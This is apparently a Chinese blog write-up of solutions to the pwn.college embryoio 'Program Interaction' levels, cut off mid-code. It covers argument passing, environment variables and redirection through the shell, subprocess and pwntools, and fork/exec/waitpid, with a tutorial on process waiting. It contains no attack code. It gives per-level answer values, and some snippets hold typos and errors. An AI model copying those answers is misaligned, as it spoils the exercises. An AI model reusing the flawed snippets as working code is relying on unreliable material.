[{"title":"Program Interaction","url":"/2023/08/10/Program Interaction/","content":"\nWelcome\n\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n\n\nssh-keygen -f key -N ''这个质量生成公钥\n\n回到虚拟机\n\nssh -i key hacker@dojo.pwn.college\n\n这个指令的终端要和key在一个目录\n\nscp -i key hacker@dojo.pwn.college:/challenge/embryoio_level ./\n\n\n\n### Level①\n\n直接运行challenge目录下的enbeyoio_level1（目标文件）\n\n### Level②\n\n运行目标文件后需要输入密码，直接输入密码就行\n\n### Level③\n\n运行目标文件后，报告提示需要使args[1]的值等于一个提示上给的值：\n使用embryoio_level3 （value）\n（传参）\n\n```python\n./embryoio_level3 jreqlmtkjj\n```\n\n### **Level④**\n\n设置[环境变量](https://so.csdn.net/so/search?q=环境变量&spm=1001.2101.3001.7020)\n\t**export xxx = xxx**\n\n```\nexport zvysqm=lxqxksocwo\n```\n\n### **Level⑤**\n\n输入（＞）重定向输出（＜）\n这道题考的是重定向输入`./embryoio_level5 > /tmp/名字`\n需要在tmp目录下，重定向输入一个题上给的文件名，然后执行\n`./embryoio_level5 ＜ /tmp/名字`\n结果发现提示说里面需要在那个文件里输入一个密码，vim输入，：wq保存退出\n继续执行命令即可\n\n\n\n### **Level⑥**\n\n运行挑战程序并将标准输出（stdout）重定向到 `/tmp/mriavb` 文件中。在终端中执行以下命令：\n\n```\nbashCopy code\n./embryoio_level5 > /tmp/mriavb\n```\n\n在这个命令中，`./embryoio_level5` 是挑战程序的执行命令，`>` 符号表示输出重定向，将程序的标准输出写入 `/tmp/mriavb` 文件中。\n\n### **Level⑦**\n\n考的零环境变量的设置\n需要用到env 命令\nenv -i ＜命令＞是设置一个空的环境变量\n那么直接\n`env -i ./embryoio_level7`\n\n### **Level⑧**\n\n在tmp目录下，用`touch 文件名.sh`命令创建一个sh文件，里面输入`/challenge/embryoio_level8`，然后在tmp目录下`bash 文件名.sh`即可\n\n### **Level⑨**\n\n同⑧，不过是要bash之后输入一个密码\n\n### **Level⑩**\n\n这题需要传参密码\n只需在sh文件里的embryoio_level10后面加一个所需要的密码就行\n\n### **Level①①**\n\n先在文件里用export设置一个环境变量，再执行/chall…/embry…11指令\n\n`the challenge will check that env[KEY] holds value VALUE (listed to the right as KEY:VALUE) : rfswxn:etmwxecyvc`：挑战会检查环境变量中名为 `rfswxn` 的键是否拥有值 `etmwxecyvc`。\n\n### **Level①②**\n\n需要在tmp目录下把密码重定向输入到这个文件里，然后重定向输出到embryoio_level12里（都是再那个文件里进行的）\n\n### **Leve①③**\n\n把embryoio_level13重定向输出到要在tmp创建的文件里\n然后cat（查看）这个文件\n\n### **Level①④**\n\nenv -i /challenge/embryoio_level14\n\n- `env`: 这是一个在Unix/Linux系统中用于设置环境变量或显示当前环境变量的命令。\n- `-i`: 这是`env`命令的一个选项，它指示`env`在执行程序时使用一个空白的环境，即清除所有环境变量，只保留少数的必需变量，比如LC_CTYPE。\n- `/challenge/embryoio_level14`: 这是要执行的程序的路径。在这种情况下，`/challenge/embryoio_level14`是一个二进制程序，通过使用空白的环境来运行它。\n\n\n\n### **Level①⑤**\n\n```python\nimport subprocess;subprocess.run([\"./embryoio_level15\"])\n\n```\n\n直接出\n\n```python\nfrom pwn import *\np=process(['/embryoio_level15'])\np.read()#p.interactive()\n```\n\n\n\n### **Level①⑥**\n\n```python\nimport subprocess;subprocess.run([\"./embryoio_level16\"])\n1\n```\n\n然后输入密码\n\n```python\nfrom pwn import *\np=process(['/embryoio_level16'])\np.read()#p.interactive()\n```\n\n然后输入密码\n\n### **Level①⑦**\n\n传参密码\n\n```python\nimport subprocess;\nsubprocess.run([\"./embryoio_level17\",\"qcfrmuvedf\"])\n```\n\nor\n\n```python\nfrom pwn import *\np=process(argv=['/embryoio_level17','qcfrmuvedf'])\np.read()#p.interactive()\n```\n\n### Level①⑧\n\n考的改变环境变量\n首先要导入pwn轮子\n\n```python\nfrom pwn import *\nfile = './embryoio_level18'\nio = process(file,env={'name':'value'})\nio.interactive\n\n```\n\n\nor\n\n```python\nimport subprocess;\nsubprocess.run('./embryoio_level18',env={'ephirb':'szxayukjbs'})\n```\n\nor\n\n```python\nfrom pwn import *\np=process(argv=['./embryoio_level18'],env={'name':'value'})\np.read()#p.interactive()\n```\n\n### Level①**⑨**\n\n先重定向输入文件\n\n```python\n.embryoio_level17 > /tmp/ksxulp\n```\n\n后输入密码在ksxulp里\n\n```python\nfrom pwn import *\np=process(argv=['./embryoio_level19'],stdin=open('/tmp/ksxulp')\np.read()#p.interctive()\n```\n\nor\n\n```python\nimport subprocess as ass\nimport os\nfile = open(\"/tmp/文件名\",'w')\nfile.write(\"密码\")\nfile1 = '/challenge/embryoio_level19'\nfile = open(\"/tmp/文件名\",'r')\nfile2 = os.open(\"/tmp/文件名\",os.O_RDONLY)\nass.run([file1],stdin=file2)\n\n```\n\n### Level②〇\n\n```python\nimport subprocess as ass\nfile = open(\"/tmp/ultuey\",'r')\nfile1 = '/challenge/embryoio_level20'\nass.run([file1],stdout=file);\nprint(file.read())\n\n```\n\nor\n\n```python\nfrom pwn import*\nf=open('/tmp/ultuey','w')\np=process(argv=['/challenge/embryoio_level20'],stdout=f)\np.interactive()\n```\n\n`p=process(argv=['/challenge/embryoio_level20'],stdout=f)`: 这行代码创建了一个子进程 `p`，指定了子进程的可执行文件为 `/challenge/embryoio_level20`。同时，使用 `stdout=f` 参数将子进程的标准输出重定向到之前打开的文件 `/tmp/ultuey` 中，这样子进程的输出将会写入到该文件中\n\n### Level②①\n\n```python\nfrom pwn import *\np=process(argv=['env','-i','./embryoio_level22'])\np.interactive()\n```\n\n```python\nimport subprocess as sp\n    \n    # 要执行的命令\n    file1 = './embryoio_level21'\n    \n    # 定义要设置的环境变量（除了 LC_CTYPE 以外为空）\n    env_vars = {\n        'LC_CTYPE': 'en_US.UTF-8'\n    }\n   \n    # 运行命令并指定环境变量\n    result = sp.run([file1], stdout=sp.PIPE, env=env_vars, text=True)\n   \n    # 打印输出\n    print(result.stdout)\n```\n\n`env_vars` 是一个Python字典，用于指定要设置的环境变量及其对应的值。在这段代码中，`env_vars` 中只包含一个键值对：\n\n- 键：'LC_CTYPE'\n- 值：'en_US.UTF-8'\n\n### Level②②\n\n```python\nfrom pwn import*\np=process('/challenge/embryoio_level22')\np.innteractive()\n```\n\nor\n\n```python\nimport subprocess\nsubprocess.run(['/challenge/embryoio_level22'])\n```\n\n### Level②③\n\n```python\nfrom pwn import*\np=process('/challenge/embryoio_level23')\np.innteractive()\n```\n\nor\n\n```python\nimport subprocess\nsubprocess.run(['/challenge/embryoio_level23'])\n```\n\n输入密码pfugoklk\n\n### Level②④\n\n```python\nfrom pwn import *\np=process(['/challenge/embryoio_level24','urbjnyuygs'])\np.interactive()\n```\n\nor\n\n```python\nimport subprocess\nsubprocess.run(['/challenge/embryoio_level24'，'urbjnyuygs'])\n```\n\n### Level②⑤\n\n```python\nfrom pwn import *\np=process(['/challenge/embryoio_level25'],env\n={'fimoun':'shspjejaxc'})\np.interactive()\n```\n\nor\n\n```python\nimport subprocess\nsubprocess.run(['/challenge/embryoio_level25']，env={'fimoun':'shspjejaxc'})\n```\n\n### Level②⑥\n\n```python\nfrom pwn import *\n\nf=open('/tmp/nrzqjx')\n\np=process(['/challenge/embryoio_level26'],std\n\nin=f)\n\np.interactive()\n```\n\nlgwuuobv\n\n```python\nimport subprocess as ass\n\n# 准备输入文件和硬编码的密码\nfile_content = \"lgwuuobv\"\n\n# 将硬编码的密码写入文件 /tmp/nrzqjx\nwith open('/tmp/nrzqjx', 'w') as file:\n    file.write(file_content)\n\nfile1 = '/challenge/embryoio_level26'\n\n# 使用 subprocess.run 来执行可执行文件，并将 /tmp/nrzqjx 文件内容作为标准输入\nresult = ass.run([file1], stdin=open('/tmp/nrzqjx'), text=True, capture_output=True)\n\n# 输出执行结果\nprint(result.stdout)\n\n# 确保处理完毕后删除临时文件\nimport os\nos.remove('/tmp/nrzqjx')\n\n```\n\n### Level②⑦\n\n```python\nfrom pwn import *\nf=open('/tmp/...','w')\np=process('/challenge/embryoio_level29',stdout=f)\np.interactive()\n```\n\n### Level②⑧\n\n```python\nfrom pwn import *\np=process(['env','-i','/challenge/embryoio_level28'])\np,interactive()\n```\n\n#### 1. 进程等待是什么\n\n我们知道一般我们在父进程**fork**出一个子进程，我们是希望子进程完成某些功能，也就是帮助父进程完成某些任务的；所以我们父进程就需要知道子进程完成的状态如何，是成功还是失败；\n所以我们就需要父进程通过**wait** 或者 **waitpid** 函数等在子进程退出；\n\n![image-20230804062053764](C:\\Users\\ASUS\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230804062053764.png)\n\n#### 2. 为什么需要父进程等待子进程退出\n\n父进程等待子进程退出，是因为父进程需要子进程退出的信息，和完成功能的状态如何；\n\n可以保证时序问题：子进程先退出，父进程再退出；\n\n可以预防子进程成为僵尸进程，防止内存泄漏的问题；而这我们需要父进程wait等待子进程退出之后，释放它的僵尸资源，也就子进程的PCB；\n\n并且我们需要知道，一旦进程成为僵尸状态，即使你使用 kill -9 也杀不死这个僵尸进程滴，只能通过父进程等待wait回收它；\n\n#### 3. 进程等待的方式\n\n#### 3.1 wait 函数\n\nwait函数的作用是父进程调用，等待子进程退出，回收子进程的资源；\n\n> \\#include<sys/types.h>\n> \\#include<sys/wait.h>\n> pid_t wait(int*status);\n> 返回值：\n> 成功返回被等待进程pid，失败返回-1。\n> 参数：\n> 输出型参数，获取子进程退出状态,不关心则可以设置成为NULL\n\n![img](https://pic4.zhimg.com/80/v2-bdf776494c4f2593ede789f87070183b_720w.webp)\n\n**该测试代码：测试wait函数返回值，测试wait回收僵尸进程；**\n\n```c++\n#include<string.h>\n#include<stdio.h>\n#include<stdlib.h>    \n#include<unistd.h>    \n#include<sys/wait.h>    \nint main()    \n{    \n  if(fork() == 0){    \n    //child process    \n    printf(\"i am a child pid=%d\\n\",getpid());    \n    exit(0); //让子进程退出    \n    \n  }    \n  //parent process执行，这里不会执行子进程了，因为子进程被我退出了 \n   sleep(2); //休息2s,为的是观察监控消息，是否子进程成为僵尸进程\n  printf(\"wait函数开始执行\\n\");\n  pid_t ret = wait(NULL);          \n  if(ret ==-1){              \n    perror(\"wait error\\n\");\n  }                            \n  //wait返回成功\n  printf(\"wait返回的是子进程的ret=%d执行结束，注意观察监控窗口是否>僵尸进程被回收\\n\",ret);  \n  sleep(2); //不让父进程那么快退出，观察窗口僵尸进程是否被回收     \n  return 0;\n               \n} \n```\n\n#### 3.2 waitpid 函数\n\n> pid_ t waitpid(pid_t pid, int *status, int options);\n> 返回值：\n> 当正常返回的时候waitpid返回收集到的子进程的进程ID；\n> 如果设置了选项WNOHANG,而调用中waitpid发现没有已退出的子进程可收集,则返回0；\n> 如果调用中出错,则返回-1,这时errno会被设置成相应的值以指示错误所在；\n> 参数：\n> pid：\n> Pid=-1,等待任一个子进程。与wait等效。\n> Pid>0.等待其进程ID与pid相等的子进程。\n> status:\n> WIFEXITED(status): 若为正常终止子进程返回的状态，则为真。（查看进程是否是正常退出）\n> WEXITSTATUS(status): 若WIFEXITED非零，提取子进程退出码。（查看进程的退出码）\n> options:\n> 参数为0:也就是阻塞版本的等待，也就是说该waitpid在子进程没有退出情况下就不会返回，就和wait的使用一模一样，因为wait的使用就是阻塞版本的等待方式；\n> 参数为WNOHANG: 这是一个宏，表示调用wait为非阻塞的版本，非阻塞也就以为执行带waitpid函数会立即返回；\n> 而设置这个参数：返回情况有以下几种：\n>\n> 若pid指定的子进程没有结束，则waitpid()函数返回0，父进程不予以等待；\n> 若正常结束，则返回该子进程的ID；\n> 若等待失败，即返回小于0；\n\n**第一层理解**：\n\n**对于 waitpid 函数就是 wait函数的增强版；**\n\n**waitpid 函数 的使用方式 waitpid(-1,NULL,0) 等价 wait 函数的使用 wait(NULL) 两者这样使用一样的；**\n\n第二层理解：\n\n\n\n1. 对于status参数，其实是一个输出型参数，也就是父进程调用该waitpid时候，可以传入一个 地址给 status；待该waitpid执行结束返回时候，会得到该staus的值；\n2. status的值表示子进程的退出码的信息，也就是父进程为了得到子进程的退出信息，就是可以通过设置一个参数传入给status,获得子进程的信息；\n3. status的退出信息：也就是子进程退出的信息，而进程退出只有三种状态：正常退出执行代码结果正确，异常退出，正常退出了但是执行的结果不正确；异常退出的进程：本质是因为收到了某种信号，才会异常退出，而对于正常退出的进程，才有退出码而言说法；不管是信号还是退出码，都是子进程需要返回给父进程中stauts参数的；\n4. 其次这个 stauts，父进程获得子进程的status；不可以简简单单的认为 stauts就是一个整形int,我们要把它为一个位图；对于32位的int类型来说：我们status是在每一个位上设置它的信息来使用的；高16位不使用，而低16位使用来表示具体信息；\n\n**3.2.1获得子进程的status信息**\n\n![img](https://pic1.zhimg.com/80/v2-9e127b4563b39e18812e4de577b055b4_720w.webp)\n\n**也就是说：对于子进程退出的状态信息：在8-16位的表示退出码的信息，低7位表示终止信号信息；而第8位单独一个表示core dump 状态，我们暂时不关系这个信息；**\n\n**那么我们是如何获得该子进程的退出的信息的呢？**\n\n我们可以通过\n\n（stauts >> 8 ）& 0xFF；获得子进程的退出码；\n\nstauts & 0x7F; 获得子进程的终止信号；\n\n**代码验证一下：**\n\n```text\n#include<stdio.h>    \n#include<string.h>                                                                                             \n#include<stdlib.h>    \n#include<unistd.h>    \n#include<sys/wait.h>    \n    \nint main()    \n{    \n  pid_t pid = fork();    \n    \n  if(pid == 0){    \n    //child    \n    printf(\"i am a process my pid  = %d\\n\",getpid());    \n    exit(11); //退出子进程，我们在父进程调用waitpid来获得子进程的退出码信息    \n  }    \n  //parent process    \n  int status; //该变量是父进程的变量，为的是在父进程获得子进程的退出状态的信息    \n  pid_t ret = waitpid(pid,&status,0);//传入status的地址，获得子进程的退出的信息    \n  if(ret == -1){    \n    perror(\"wait failed\\n\");    \n  }    \n  //waitpid 等待成功    \n  //打印子进程的stauts退出码信息和终止信号信息，这是在父进获取到子进程的信息    \n  printf(\"waitpid 返回的stauts 的退出码信息：%d,终止信号的信息：%d\\n\",(status>>8)&0xFF,status&0x7F);    \n  return 0;    \n}\n```\n\n![img](https://pic1.zhimg.com/80/v2-27ac8692e925a9c72a887aba3ec1110c_720w.webp)\n\n这里我并没演示退出时候异常退出的情况，也就是我没有演示发送信号给子进程会有什么样的状态：\n\n其实就是在另一个窗口给子该进程发送一个信号值，当进程退出时候，这个信号就会被返回到父进程的stauts中，这样就能获取了；\n\n当然异常的情况还有内存越界，什么段错误，什么除0操作，一旦程序出现这些状态，也可以在父进程waitpid中的参数status中获取得到，我就不演示了；感兴趣可以试一试；\n\n我们获得子进程的退出码，其实可以不用通过：位操作的(status >> 8 )& 0xFF获取，\n\n在我们的C程序中提供一个宏：\n\nWIFEXITED(status): 若为正常终止子进程返回的状态，则为真；\n\n那么我们就可以通过if判断该条件是否真假，获得子进程的退出码：\n\n获得的方式为这个宏WEXITSTATUS(status): 若WIFEXITED非零，提取子进程退出码。\n\n**测试子进程正常退出，获取它的状态码：**\n\n```text\n#include<stdio.h>    \n#include<string.h>                                                                                             \n#include<stdlib.h>    \n#include<unistd.h>    \n#include<sys/wait.h>        \nint main()    \n{    \n  pid_t pid = fork();    \n    \n  if(pid == 0){    \n    //child    \n    printf(\"i am a process my pid  = %d\\n\",getpid());    \n    exit(11); //退出子进程，我们在父进程调用waitpid来获得子进程的退出码信息    \n  }    \n  //parent process    \n  int status; //该变量是父进程的变量，为的是在父进程获得子进程的退出状态的信息    \n  pid_t ret = waitpid(pid,&status,0);//传入status的地址，获得子进程的退出的信息    \n  if(ret == -1){    \n    perror(\"wait failed\\n\");    \n  }    \n  //waitpid 等待成功\n    if(WIFEXITED(status)){    \n    printf(\"子进程pid = %d 正常退出，父进程获得子进程的退出码为：%d\\n\",pid,WEXITSTATUS(status));    \n  }    \n  else{    \n    printf(\"WIFEXITED为假，子进程异常退出，非正常退出\\n\");                                                       \n  }       \n  return 0;    \n}\n```\n\n测试代码的结果：\n\n![img](https://pic1.zhimg.com/80/v2-f67e1854daa8000633b57ea54e603e78_720w.webp)\n\n假如子进程异常退出，那么就会执行else分支语句，不会获得退出码；\n\n#### 3.2.2 理解下waitpid内部是如何返回status的\n\n我们知道：当我们创建进程时候，在内核是有该进程的PCB的，而PCB里面存放着我们进程退出的信息；\n\n也就是有退出码和终止信号，在用户层父进程调用waitpid函数时候，该函数进入内核会给把我们的子进程的PCB退出码和终止信号信息给status赋值；\n\n也就是大概类似这样的操作：\n\n![img](https://pic3.zhimg.com/80/v2-44c9bca831a4e1569fb460023f1eaffa_720w.webp)\n\n#### 3.2.3 waitpid 的options参数的理解\n\n**该参数设置：一般设置为WNOHANG：表示为父进程是以非阻塞的方式等待子进程；**\n\n但是非阻塞方式等待子进程退出就有几种情况：\n\n> \\> 1.子进程没有退出，但是父进程调用的waitpid返回了0，这也表示等待子进程成功，只不过子进程没有退出，此时表示需要继续做父进程的事情；\n> \\2. 子进程退出了，f父进程调用waitpid函数返回子进程的PID， 也就是等待成功了，这时候我们在父进程可以拿到子进程的退出状态信息；\n> \\3. waitpid等待子进程退出失败，waitpid就会返回小于0的值，此时就可以做一些输出错误信息给用户；\n\n**阻塞本质就是：调用该函数的父进程由在运行队列被放入到了等待队列中等待，同时修改进程状态为S；**\n\n**waitpid返回的本质也就是：将该父进程从等待队列拿到运行队列中执行；**\n\n测试options：**WNODHANG**\n\n非阻塞等待子进程；\n\n一般而言**我们会使用一种叫做非阻塞轮回检测技术来检测子进程的退出状态**，也就是说：我希望子进程退出能够被我父进程检测到，同时我又不希望我父进程处于阻塞等待，也就是父进程不希望自己什么事都不可以做，只等子进程退出返回；\n\n如何做到呢？\n\n```text\n#include<stdio.h>    \n#include<string.h>    \n#include<stdlib.h>    \n#include<unistd.h>    \n#include<sys/wait.h>    \n    \nint main()    \n{                                                                                                                                        \n  pid_t pid = fork();    \n    \n  if(pid == 0){    \n    //child    \n    int count = 10;    \n    while(count){    \n    printf(\"i am a process my pid  = %d\\n\",getpid());    \n    count --;    \n    sleep(1);    \n    }    \n    exit(11); //退出子进程，我们在父进程调用waitpid来获得子进程的退出码信息    \n  }    \n  //parent process    \n  int status; //该变量是父进程的变量，为的是在父进程获得子进程的退出状态的信息    \n    \n  while(1){ //这个循环就是继续轮回检测的非阻塞版本的设计，假如子进程没退出，我们一直死循环检测知道直到它退出    \n  pid_t ret = waitpid(pid,&status,WNOHANG);//WNOHANG:表示父进程非阻塞方式等待子进程退出    \n  if(ret==0){    \n    //ret == 0 表示waitpid等待成功，但是子进程还没有退出，waitpid返回0回到父进程的代码执行    \n    //做父进程的事情；\n        printf(\"我waitpid返回0，等待子进程成功，但是子进程没有退出，我可做父进程要做的事\\n\");\n  }\n  else if(ret > 0){\n     //waitpid 等待成功,子进程退出，父进程就可以获取子进程的信息\n    printf(\"waitpid 返回的stauts 的退出码信息：%d,终止信号的信息：%d\\n\",(status>>8)&0xFF,status&0x7F);\n    break;\n  }\n  else{\n    printf(\"waitpid is failed\\n\");\n    break;\n  }  \n  sleep(1); //让父进程每隔一秒去检测\n}\n  return 0;\n}\n```\n\n![img](https://pic2.zhimg.com/80/v2-921b0d0364ee075fe8977ec8e9edd65d_720w.webp)\n\n#### **根目录是\"/\"当前用户的目录是\"~\"**\n\n### Level②⑨\n\n```c\n#include<stdio.h>\n#include<stdlib.h>\n#include<sys/wait.h>\n#include<unistd.h>\nvoid pwncollege(){\n    char *args[]={\"/challenge/embryoio_level29\",NULL};\n    execvp(\"/challenge/embryoio_level29\",args);\n\tprintf(\"pwn.college\");\n}\nint main(int argc,char** argv[],char* env[]){\n    int stat;\n    int childPid;\n    pid_t pid;\n    if (fork()==0){\nchildPid=getpid();\n    printf(\"child pid is %d\\n\",childPid);\n        pwncollege();\n        printf(\"ok,i am child ,iwll leave\\n\");\n        \n    }else{\n        printf(\"parent pid is %d\\n\",getpid());\n        waitpid(childPid,NULL,0);\n        printf(\"ok,i am father, i will leave\\n\");\n        return 0;\n    }\n}\n```\n\n总结一下看出来的知识点：\n\n1. 对父进程的检测需要使用exec()系列的函数，因为system()或popen()函数都会执行一个shell，然后用shell来执行，所以此时父进程为shell（测试后是dash），而不是你的程序。\n2. 而exec()只是替换掉正在exec()的进程，当用fork()函数时子进程调用exec()系列函数杀死自己的子进程副本的时候就会建立与当前主进程的父子关系。\n3. 当一个父亲创建了一个孩子但没有等它结束就自己结束的话就可能造成系统异常，查询waitpid()的使用来等待孩子进程。\n\n另外查询了一下，说是exec系统调用，实际上在Linux中，并不存在一个exec()的函数形式，exec指的是一组函数，一共有6个，分别是：\n\n```c\n#include <unistd.h>\nint execl(const char *path, const char *arg, ...);\nint execlp(const char *file, const char *arg, ...);\nint execle(const char *path, const char *arg, ..., char *const envp[]);\nint execv(const char *path, char *const argv[]);\nint execvp(const char *file, char *const argv[]);\nint execve(const char *path, char *const argv[], char *const envp[]);\n```\n\n然后整理了一下基本使用：\n\n```c\n#include <stdio.h>\n#include <unistd.h>\n\nvoid pwncollege(char* argv[],char *env[]){\n    execve(\"/challenge/embryoio_level29\",argv,env);//使用exec系列函数执行时不会改变新进程的父亲，相当于只是将当前进>程替换掉了\n    return ;\n}\n\nint main(int argc,char* argv[],char* env[]){\n    pid_t fpid;\n\n    fpid=fork();//fork()执行之后，会复制一个基本一样的进程作为子进程，然后两个进程会分别执行后面的代码\n    if(fpid<0)//如果fpid为-1，说明fork失败\n            printf(\"error in fork!\\n\");\n    else if (fpid==0){//成功则会出现两个进程，fpid==0的是子进程\n            printf(\"我是子进程\\n\");\n            pwncollege(argv,env);\n    }\n    else{//fpid==1的是父进程\n            printf(\"我是父进程\\n\");\n            wait(NULL);\n    }\n    return 0;\n}\n```\n\n然后又是一次轮回。\n\n注意，设定参数数组时，第一个不是参数而是文件名，而且最后需要加NULL（因为数组最后一位需要为\\0吧。），这两个任意错了一步就会导致运行子进程失败：\n\n```c\n#include <stdio.h>\n#include <unistd.h>\n\nvoid pwncollege(char* argv[],char *env[]){\n    char *newargv[]={\"embryoio_level31\",\"scfxabffgf\",NULL};\n    execve(\"/challenge/embryoio_level31\",newargv,env);//使用exec系列函数执行时不会改变新进程的父亲，相当于只是将当前>进程替换掉了\n    return ;\n}\n\nint main(int argc,char* argv[],char* env[]){\n    pid_t fpid;\n\n    fpid=fork();//fork()执行之后，会复制一个基本一样的进程作为子进程，然后两个进程会分别执行后面的代码\n    if(fpid<0)//如果fpid为-1，说明fork失败\n            printf(\"error in fork!\\n\");\n    else if (fpid==0){//成功则会出现两个进程，fpid==0的是子进程\n            printf(\"我是子进程\\n\");\n            pwncollege(argv,env);\n    }\n    else{//fpid==1的是父进程\n            printf(\"我是父进程\\n\");\n            wait(NULL);\n    }\n    return 0;\n}\n```\n\n### Level③O\n\n```c\n#include<stdio.h>\n#include<stdlib.h>\n#include<sys/wait.h>\n#include<unistd.h>\nvoid pwncollege(){\n    char* const argv[]={\"/challenge/embryoio_level30\",NULL};\n    const char* file=\"/challenge/embrhyoio_level30\"\n    execvp(file,argv);\n\tprintf(\"pwn.college\");\n}\nint main(int argc,char** argv[],char* env[]){\n    int stat;\n    int childPid;\n    pid_t pid;\n    if (fork()==0){\nchildPid=getpid();\n    printf(\"child pid is %d\\n\",childPid);\n        pwncollege();\n        printf(\"ok,i am child ,iwll leave\\n\");\n        \n    }else{\n        printf(\"parent pid is %d\\n\",getpid());\n        waitpid(childPid,NULL,0);\n        printf(\"ok,i am father, i will leave\\n\");\n        return 0;\n    }\n}\n```\n\nslibtmfk\n\n### Level③①\n\n```python\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/wait.h>\n#include <unistd.h>\nvoid pwncollege(){\n        char* const argv[]={\"/challenge/embryoio_level31\",\"niibxwjmor\",NULL};\n    const char* file=\"/challenge/embryoio_level31\";\n    execvp(file,argv);\n}\nint main(int argc,char** argv[],char* env[]){\n    int childPid;\n    pid_t pid;\n    if (fork()==0){\n        childPid=getpid();\n        printf(\"child pid is %d\\n\",childPid);\n        pwncollege();\n        printf(\"ok, i am child,i will leave\\n\");\n    }else{\n        printf(\"parent pid is %d\\n\",getpid());\n        waitpid(childPid,NULL,0);\n        printf(\"ok,i am father, i will leae\\n\");\n    }\n    return 0;\n}\n```\n\n### Level③②\n\n```c\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/wait.h>\n#include <unistd.h>\n\nvoid pwncollege() {\n    char* const argv[] = { \"/challenge/embryoio_level32\", NULL };\n    const char* file = \"/challenge/embryoio_level32\";\n    char* const envp[] = { \"dzsioq=fqenenoweh\", NULL };\n    execve(file, argv, envp);\n    perror(\"execve\"); // Handle error if execve fails\n}\n\nint main(int argc, char* argv[], char* env[]) {\n    int childPid;\n    pid_t pid;\n\n    if ((pid = fork()) == 0) {\n        childPid = getpid();\n        printf(\"child pid is %d\\n\", childPid);\n        pwncollege();\n        printf(\"This line will not be reached if execve succeeds.\\n\");\n    } else if (pid > 0) {\n        waitpid(pid, NULL, 0);\n        printf(\"parent pid is %d\\n\", getpid());\n        printf(\"ok, I am father, I will leave\\n\");\n    } else {\n        perror(\"fork\");\n        return 1;\n    }\n\n    return 0;\n}\n\n```\n\n### **输入重定向**：把文件导入到命令中。 输出重定向**：把原本要输出到屏幕的数据信息写入到指定的文件中。\n\nSTDIN_FILENO：接收键盘的输入\n\nSTDOUT_FILENO：向屏幕输出\n\n下列是参数flags 所能使用的旗标:\n\n**O_RDONLY** 以只读方式打开文件\n\n**O_WRONLY** 以只写方式打开文件\n\n**O_RDWR**\n\n以可读写方式打开文件。上述三种旗标是互斥的，也就是不可同时使用，但可与下列的旗标利用**OR(|)**运算符组合。\n\n**O_CREAT** 若欲打开的文件不存在则自动建立该文件。\n\n**O_EXCL**\n\n如果**O_CREAT**也被设置，此指令会去检查文件是否存在。文件若不存在则建立该文件，否则将导致打开文件错误。此外，若**O_CREAT**与**O_EXCL**同时设置，并且欲打开的文件为符号连接，则会打开文件失败。\n\n**O_NOCTTY**\n\n如果欲打开的文件为终端机设备时，则不会将该终端机当成进程控制终端机。\n\n**O_TRUNC**\n\n若文件存在并且以可写的方式打开时，此旗标会令文件长度清为0，而原来存于该文件的资料也会消失。\n\n**O_APPEND**\n\n当读写文件时会从文件尾开始移动，也就是所写入的数据会以附加的方式加入到文件后面。\n\n**O_NONBLOCK**\n\n以不可阻断的方式打开文件，也就是无论有无数据读取或等待，都会立即返回进程之中。\n\n**O_NDELAY** 同**O_NONBLOCK。**\n\n**O_SYNC** 以同步的方式打开文件。\n\n**O_NOFOLLOW** 如果参数**pathname**\n\n所指的文件为一符号连接，则会令打开文件失败。\n\n**O_DIRECTORY** 如果参数**pathname**\n\n所指的文件并非为一目录，则会令打开文件失败。\n\n**参数mode**\n\n则有下列数种组合，只有在建立新文件时才会生效，此外真正建文件时的权限会受到umask值所影响，因此该文件权限应该为(mode-umaks)。\n\n**S_IRWXU00700**权限，代表该文件所有者具有可读、可写及可执行的权限。\n\n**S_IRUSR**或**S_IREAD**，00400权限，代表该文件所有者具有可读取的权限。\n\n**S_IWUSR** 或**S_IWRITE**，00200权限，代表该文件所有者具有可写入的权限。\n\n**S_IXUSR** 或**S_IEXEC**，00100\n\n权限，代表该文件所有者具有可执行的权限。**S_IRWXG**00070权限，代表该文件用户组具有可读、可写及可执行的权限。\n\n**S_IRGRP** 00040权限，代表该文件用户组具有可读的权限。\n\n**S_IWGRP**00020权限，代表该文件用户组具有可写入的权限。\n\n**S_IXGRP** 00010权限，代表该文件用户组具有可执行的权限。\n\n**S_IRWXO**00007权限，代表其他用户具有可读、可写及可执行的权限。\n\n**S_IROTH** 00004 权限，代表其他用户具有可读的权限\n\n**S_IWOTH**00002权限，代表其他用户具有可写入的权限。\n\n**S_IXOTH** 00001权限，代表其他用户具有可执行的权限。\n\n返回值\n\n若所有欲核查的权限都通过了检查则返回0值，表示成功，只要有一个权限被禁止则返回-1。\n\n错误代码\n\n**EEXIST** 参数pathname\n\n所指的文件已存在，却使用了O_CREAT和O_EXCL旗标。\n\n**EACCESS**\n\n参数pathname所指的文件不符合所要求测试的权限。\n\n**EROFS** 欲测试写入权限的文件存在于只读文件系统内。\n\n**EFAULT** 参数pathname指针超出可存取内存空间。\n\n**EINVAL** 参数mode 不正确。\n\n**ENAMETOOLONG** 参数pathname太长。\n\n**ENOTDIR** 参数pathname不是目录。\n\n**ENOMEM** 核心内存不足。\n\n**ELOOP** 参数pathname有过多符号连接问题。\n\n**EIO I/O** 存取错误。\n\n### Level③③\n\n\n\n```c\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/wait.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n\nvoid pwncollege() {\n    char *const argv[] = { \"/challenge/embryoio_level33\", NULL };\n    const char *file = \"/challenge/embryoio_level33\";\n\n    // 尝试执行指定的二进制文件\n    execvp(file, argv);\n\n    // 如果 execvp 失败，输出错误信息并退出\n    perror(\"execvp\");\n    exit(EXIT_FAILURE);\n}\n\nint main(int argc, char *argv[], char *env[]) {\n    pid_t childPid;\n    int old_fd = open(\"/tmp/tnvecb\", O_RDONLY);\n    if (old_fd == -1) {\n        perror(\"open\");\n        return 1;\n    }\n\n    // 将文件描述符 old_fd 重定向为标准输入\n    dup2(old_fd, STDIN_FILENO);\n    close(old_fd);\n\n    // 创建子进程\n    childPid = fork();\n    if (childPid < 0) {\n        perror(\"fork\");\n        return 1;\n    } else if (childPid == 0) { // 子进程\n        printf(\"child pid is %d\\n\", getpid());\n\n        // 执行 pwncollege 函数尝试运行指定的二进制文件\n        pwncollege();\n\n        // 这部分只在 execvp 失败时执行\n        printf(\"ok, I am child, I will 